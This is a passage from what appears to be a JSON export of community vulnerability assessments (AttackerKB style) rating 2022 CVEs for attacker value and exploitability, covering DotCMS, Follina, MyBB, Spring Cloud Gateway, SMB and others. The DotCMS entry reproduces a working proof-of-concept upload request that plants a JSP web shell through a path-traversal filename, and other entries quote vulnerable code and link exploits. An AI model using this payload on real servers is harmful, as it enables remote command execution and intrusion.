      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6bd888d1-954c-43f0-b556-4da431cac285",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "2bbffc82-b69b-4a49-9b90-a6e5c745141f",
      "created": "2022-05-26T21:39:04.319093Z",
      "revisionDate": "2022-08-02T21:11:49.663456Z",
      "document": "[CVE-2022-22954](https://attackerkb.com/topics/BDXyTqY1ld/cve-2022-22954/rapid7-analysis) came out at nearly the same time, is easier to exploit, and grants access to the underlying OS rather than the web interface. I think that's going to be the issue that ends up mattering, and this will be overshadowed.\r\n\r\nThe biggest problem is that this requires an Internet-facing SSL server, so attacks can't easily be automated.",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "701cea52-e56c-439d-9444-fc09747a5a68",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "bfe90b13-c7b7-4af4-b31c-fea8b1a352b3",
      "created": "2022-05-26T22:31:04.580075Z",
      "revisionDate": "2022-06-07T14:08:59.588604Z",
      "document": "The API used by DotCMS is vulnerable to an arbitrary file upload vulnerability which can lead to RCE. The `/api/content/` endpoint allows for files to be uploaded to the tomcat server. The filename in versions prior to  `22.03, 5.3.8.10, 21.06.7`  is not sanitized and allows the attacker to drop a malicious `.jsp` file in the webroot of the tomcat server, which is accessible remotely. \r\n\r\nPoC taken from the write up mentioned below:\r\n```\r\nPOST /api/content/ HTTP/1.1\r\nHost: 172.16.199.227:8443\r\nUser-Agent: curl/7.64.1\r\nAccept: */*\r\nContent-Length: 1085\r\nContent-Type: multipart/form-data; boundary=------------------------aadc326f7ae3eac3\r\nConnection: close\r\n\r\n--------------------------aadc326f7ae3eac3\r\nContent-Disposition: form-data; name=\"name\"; filename=\"../../a.jsp\"\r\nContent-Type: text/plain\r\n\r\n<%@ page import=\"java.util.*,java.io.*\"%>\r\n<%\r\n%>\r\n<HTML><BODY>\r\nCommands with JSP\r\n<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\r\n<INPUT TYPE=\"text\" NAME=\"cmd\">\r\n<INPUT TYPE=\"submit\" VALUE=\"Send\">\r\n</FORM>\r\n<pre>\r\n<%\r\nif (request.getParameter(\"cmd\") != null) {\r\n    out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\r\n    Process p;\r\n    if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\r\n        p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\"));\r\n    }\r\n    else{\r\n        p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\r\n    }\r\n    OutputStream os = p.getOutputStream();\r\n    InputStream in = p.getInputStream();\r\n    DataInputStream dis = new DataInputStream(in);\r\n    String disr = dis.readLine();\r\n    while ( disr != null ) {\r\n    out.println(disr);\r\n    disr = dis.readLine();\r\n    }\r\n}\r\n%>\r\n</pre>\r\n</BODY></HTML>\r\n--------------------------aadc326f7ae3eac3--\r\n```\r\nThe filename has been changed to work on windows and on linux irrespective of the relative install path of DotCMS.\r\n\r\nThis vulnerability is trivial to exploit and patching immediately is recommended. \r\n\r\nThe security research to find this vulnerability was performed by\u00a0[Hussein Daher](https://twitter.com/HusseiN98D)\u00a0and\u00a0[Shubham Shah](https://twitter.com/infosec_au) and they have written a very nice [detailed write up](https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/) for more information.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f526470d-5597-4432-84ae-87ebaaa537ec",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "f5f5b5db-7101-49ee-9848-8201896d05bb",
      "created": "2022-05-27T08:08:43.091979Z",
      "revisionDate": "2022-05-27T08:08:43.091468Z",
      "document": "It is exposing PII (Personally Identifiable Information) from registered events in the calendar but also usernames and password hashes for offline crack.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4cb4b190-ed51-407c-aa8c-b2e886f74b8f",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "84c5dd8d-9a9e-4f85-9cc7-d9cba778a3c7",
      "created": "2022-05-27T08:15:59.422649Z",
      "revisionDate": "2022-06-01T17:42:27.670369Z",
      "document": "iTop is a common ITIL software, it gives access to tons of information on the IT department, IP ranges, machine information, support tickets, username, it's often plugged to AD LDAP, etc. Having RCE on the server allows to read configuration files containing LDAP service account credentials, retrieve local users password hashes for password spraying, obtain web admin credentials to access the information gold mine, etc.\r\nAny low privilege account will work for the exploit, in general every employee have an account.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "807fb0bd-db77-4d9d-a2c0-f7044f95bcf8",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "1fa9a53c-0452-4411-96c9-c0dd833f8d18",
      "created": "2022-05-31T12:56:22.27861Z",
      "revisionDate": "2022-06-08T15:38:53.684526Z",
      "document": "EDIT: This was a quick description, and while it is still accurate as far as I know, A Rapid7 Evaluation with greater analysis has been published here: https://attackerkb.com/topics/Z0pUwH0BFV/cve-2022-30190/rapid7-analysis\r\n\r\nThis is a relatively new vulnerability in the Microsoft Support Diagnostic Tool Vulnerability, so it is likely more information will come out in the coming days.\r\nCurrently, as seen in the wild, this vulnerability is embedded in a word document and likely distributed with a *.rar file.  When the Word document is opened, it reaches out and downloads an HTML file which has a JS section to implement the ms-msdt (Microsoft Support Diagnostic Tool Vulnerability) protocol which is then coerced into launching a command.\r\nAs reported by Jake Williams in a thread here: https://twitter.com/MalwareJake/status/1531019243411623939, the command opens the accomplanying `*.rar` file and pulls a base64 encoded `*.cab` file from it, then expands the *cab file and runs a file contained in the cab file called `rgb.exe`  THIS FILENAME IS LIKELY MUTABLE, SO I DO NOT RECCOMMEND POLICING FOR IT WITHOUT OTHER RULES.\r\nMicrosoft has already published mitigation techniques for this exploit: https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/\r\nUsers are required to delete a single registry key called `HKEY_CLASSES_ROOT\\ms-msdt` though there is little discussion about the side effects of this operation.  In his thread, Jake Williams has verified that the removal of this key prevents execution of the embedded payload.\r\nFurther reading:\r\nhttps://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\r\nUntested and unverified PoC: https://github.com/chvancooten/follina.py/blob/main/follina.py\r\nhttps://www.scythe.io/library/breaking-follina-msdt-vulnerability\r\n\r\nUPDATE: I adjusted the attacker value up in light of reports by Kevin Beaumont that if the attacker uses an RTF file as the host, then the exploit code will run just viewing the file in the preview pane with explorer.exe. (details here: https://github.com/JMousqueton/PoC-CVE-2022-30190 and the above doublepulsar blog post)",
      "score": 7,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "abf1a298-b964-4074-a8c2-fe43ba02ca37",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "4b890273-7cd9-4728-9ff9-b11f14da5242",
      "created": "2022-06-01T13:32:59.346747Z",
      "revisionDate": "2022-06-08T15:38:46.864372Z",
      "document": "This is an arbitrary code injection vulnerability caused by unsanitized user input in a [call](https://github.com/mybb/mybb/blob/6ab629a97104d2b9b297e8fa960146835e7c93ae/admin/modules/config/settings.php#L1540) to the PHP `eval()` function.\r\n```\r\n...\r\nelse if($type[0] == \"php\")\r\n{\r\n    $setting['optionscode'] = substr($setting['optionscode'], 3);\r\n    eval(\"\\$setting_code = \\\"\".$setting['optionscode'].\"\\\";\");\r\n}\r\n...\r\n```\r\n\r\nTo trigger the vulnerability and achieve remote command execution, an attacker will have to create a crafted configuration setting with the payload and send a second request to trigger the execution. A Metasploit [module](https://github.com/rapid7/metasploit-framework/pull/16607), based on the original [PoC](https://github.com/Altelus1/CVE-2022-24734), is available.\r\n\r\nNote that authentication to Admin CP is required for this exploit to work and the account must have rights to add or update settings. Also, since the user running PHP is usually a non-privileged user, the exploit won't get you privileged access.",
      "score": 5,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "b5322f4a-fa56-420e-9b4a-55626c4bbbcf",
      "editorId": "26d66da5-c965-4d4b-8ddb-999f1d1c20a9",
      "topicId": "9ae1a02c-ab77-47d3-925d-16f61a76b572",
      "created": "2022-06-02T18:29:27.475242Z",
      "revisionDate": "2022-06-08T15:38:43.43491Z",
      "document": "CVE-2022-22947 is a remote code execution vulnerability in Spring Cloud Gateway that is currently being exploited in the wild. The vulnerable condition stems from Spring Expression Language (SpEL) expressions being passed to the StandardEvaluationContext context. This means that any valid SpEL expression passed to the context is executed.\r\n\r\nWyatt Dahlenberg provided a proof of concept exploit on his [blog](https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/), which works on crafted vulnerable applications. In order to expose the interface, you need to modify the applications.properties file for an application using the Spring Cloud Gateway, suggesting that exposure of the vulnerable API is both non-standard and relatively uncommon.\r\n\r\nTelemetry from Rapid7\u2019s Project Heisenberg reveals a small number of exploit attempts (and scanners looking for vulnerable applications) over the last two months. This suggests that the scale of exploitation is low at this time.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "f72c8b56-8bb9-4706-a4d4-9c4053de39de",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "812ed357-c31f-4733-afda-96facdd8a486",
      "created": "2022-06-03T19:21:05.455671Z",
      "revisionDate": "2023-04-15T19:02:57.140727Z",
      "document": "CVE-2022-26134 is an unauthenticated and remote OGNL injection that is trivial to exploit. See the Rapid7 analysis for additional details.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "29310b68-b92b-49d6-b73f-ba8548142483",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "cb8adabf-bae1-48df-8e77-2654ca39019c",
      "created": "2022-06-07T18:41:37.334175Z",
      "revisionDate": "2022-07-21T20:56:04.007093Z",
      "document": "It gives GLPI version, the list of all plugins and their version, and some system info like the database used and its version, sometimes the webserver engine, the PHP version and the list of all PHP modules loaded, the OS distro and version + the kernel name and version.",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "1f7db1b4-d580-4fc2-8402-6d1a5dd33026",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "e51548ee-c37c-4de5-952e-829615a7f87f",
      "created": "2022-06-08T21:52:43.903136Z",
      "revisionDate": "2022-06-12T07:00:58.811367Z",
      "document": "Authenticated Remote Code Execution in Tp-Link Routers. PoC is publicly available\r\n\r\nhttps://github.com/aaronsvk/CVE-2022-30075",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "0820d7e3-c5d2-4d74-88cb-8e9e72e2608d",
      "editorId": "d19ad92c-a65f-4d46-9050-8342d770a43e",
      "topicId": "ccb24fab-7e8f-4411-beb9-0cfed68e1654",
      "created": "2022-06-21T04:57:02.598143Z",
      "revisionDate": "2022-07-21T20:54:48.37766Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "ad7ae5ec-838f-4561-9318-db938ea15bc3",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "1d55ade6-9832-4535-b448-2fa653035c46",
      "created": "2022-06-21T20:39:24.063075Z",
      "revisionDate": "2022-07-21T20:54:35.645579Z",
      "document": "A remote and unauthenticated attacker can trigger a denial-of-service condition on Microsoft Windows Domain Controllers by leveraging a flaw that leads to a null pointer deference within the Windows kernel. This vulnerability was silently patched by Microsoft in April of 2022 in the same batch of changes that addressed the unrelated CVE-2022-24500 vulnerability.\r\n\r\nCVE-2022-32230 is caused by a missing check in `srv2!Smb2ValidateVolumeObjectsMatch` to verify that a pointer is not null before reading a PDEVICE_OBJECT from it and passing it to IoGetBaseFileSystemDeviceObject. This function is called from the dispatch routine for an `SMB2 QUERY_INFO` request of the `FILE_INFO` / `FILE_NORMALIZED_NAME_INFORMATION` class. Per the docs in MS-SMB2 section 3.3.5.20.1 Handling `SMB2_0_INFO_FILE`, `FILE_NORMALIZED_NAME_INFORMATION` is only available when the dialect is 3.1.1.\r\n\r\n> For FileNormalizedNameInformation information class requests, if not supported by the server implementation<392>, or if Connection.Dialect is \"2.0.2\", \"2.1\" or \"3.0.2\", the server MUST fail the request with `STATUS_NOT_SUPPORTED`.\r\n\r\nOnly newer versions of Windows that support the SMB 3.1.1 dialect are affected by this flaw (Windows 10 / Server 2019 and later).\r\n\r\nTo trigger this code path, a user would open any named pipe from the IPC$ share and make a `QUERY_INFO` request for the `FILE_NORMALIZED_NAME_INFORMATION` class. This typically requires user permissions or a non-default configuration enabling guest access. This is not the case, however, for the noteworthy exception of domain controllers where there are multiple named pipes that can be opened anonymously, such as `netlogon`. An alternative named pipe that can be used but does typically require permissions is the `srvsvc` pipe.\r\n\r\nUnder normal circumstances, the `FILE_NORMALIZED_NAME_INFORMATION` class would be used to query the normalized name information of a file that exists on disk. This differs from the exploitation scenario which queries a named pipe.\r\n\r\nA system that has applied the patch for this vulnerability will respond to the request with the error `STATUS_NOT_SUPPORTED`.",
      "score": 3,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "a93a41f0-347d-4267-817d-d16e639cec0d",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "99bfe9dc-25a2-4c97-8a94-c625d38e04ef",
      "created": "2022-06-22T16:31:08.130416Z",
      "revisionDate": "2022-06-22T16:31:08.129539Z",
      "document": "RCE vulnerability that effects  Bently Nevada 3701 (OT device) \r\nMaintenance interface has undocumented, \r\nhardcoded credentials\r\n\r\nSource: https://www.forescout.com/resources/ot-icefall-report/",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "3d260392-e682-4767-a16e-6f8d446cd8d7",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "9e58a7ae-963d-4156-aed7-67b5f3e68ed3",
      "created": "2022-06-25T04:56:30.23704Z",
      "revisionDate": "2022-08-20T22:05:44.843626Z",
      "document": "## [CVE-2022-30174](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30174)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2022/CVE-2022-30174/Docs/Screenshot%202022-06-24%20200045.png)\r\n\r\n## Description:\r\nMicrosoft Office Remote Code Execution Vulnerability.\r\nThis attack requires a specially crafted file to be placed either in an online directory or in a local network location. \r\nWhen a victim runs this file, it loads the malicious DLL or EXE file.\r\n\r\n## WARNING:\r\nUse your `Windows Defender` `turned` `on` and `update` him regularly!!!\r\n\r\n## Conclusion:\r\n\r\n- - So. I've decided to test this stupid and forever stupid thing MS Office 365 which is from 7 maybe 10 years just like that. Some things will never change.\r\n\r\n- Tested on Windows 11.\r\n\r\n- 365 don't give a f*** what you give him to execute, it depends on the lure...  \r\n\r\n- For the `usual users`: If you don't have some virus protection software, you are lost...\ud83d\ude2f \ud83d\ude1d \ud83e\udd2b \ud83d\ude1b \ud83d\ude0e\r\n\r\n- STATUS: Medium vulnerability but it is there! Watch out, dear friends! \ud83d\ude0e\r\n\r\n## Proof and Exploit:\r\n[href](https://streamable.com/2zgr55)",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "e3dbbc98-d1e9-4691-abfd-fbf847511221",
      "editorId": "eee960bc-4e77-49fa-9a49-62bedc6826c0",
      "topicId": "5c5cf44f-4053-48ba-9373-475cd90d7353",
      "created": "2022-07-01T06:55:38.336514Z",
      "revisionDate": "2022-07-01T06:55:38.336715Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": []
    },
    {
      "id": "c3efcdbc-0de4-491e-80bd-c38dcb665164",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "23f2b591-fe1e-47a8-aa83-2dfad7e5ce61",
      "created": "2022-07-05T03:18:54.327599Z",
      "revisionDate": "2022-07-21T20:43:51.16257Z",
      "document": "Looks like this was a heap buffer overflow in WebRTC which could allow for a drive by attack that would grant attackers RCE on a target system. No news as to whether or not this was used with a sandbox escape though, It was reported by Jan Vojtesek from the Avast Threat Intelligence team on 2022-07-01 according to https://chromereleases.googleblog.com/2022/07/stable-channel-update-for-desktop.html, yet interestingly https://chromereleases.googleblog.com/2022/07/chrome-for-android-update.html also note it affects Chrome for Android.\r\n\r\nThere is a real world exploit for this out in the wild but given the generally tight lipped news around this and that it was found from a threat intelligence team, I would imagine this may have been used in more targeted attacks, but still widely enough that a threat intelligence team picked up on it. Bit hard to tell though since I hadn't heard about the Avast Threat Intelligence team prior to this; I imagine its possible one of their customers was targeted selectively and then they found out and notified Google.\r\n\r\nWith heap overflow bugs I generally err on the side of \"well these things are harder to exploit\" however with browsers you typically have access to a much wider arsenal to use for crafting the heap into a state that is desirable for exploitation purposes, so the risk is a bit higher here. That being said exploitation of such bugs tends to be a little more complex in most cases, particularly given recent mitigations. I'd still recommend patching this one if you can, but if not then you should try to disable WebRTC on your browsers until you can patch given in the wild exploitation.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "93a2b29b-f402-437b-82dd-f146f333561a",
      "editorId": "ee48ec9b-4ec1-4d96-a663-a919034cb15e",
      "topicId": "cfb0aafd-3583-4ac0-a851-464edc60c17c",
      "created": "2022-07-05T08:45:00.676073Z",
      "revisionDate": "2022-07-21T20:43:39.643881Z",
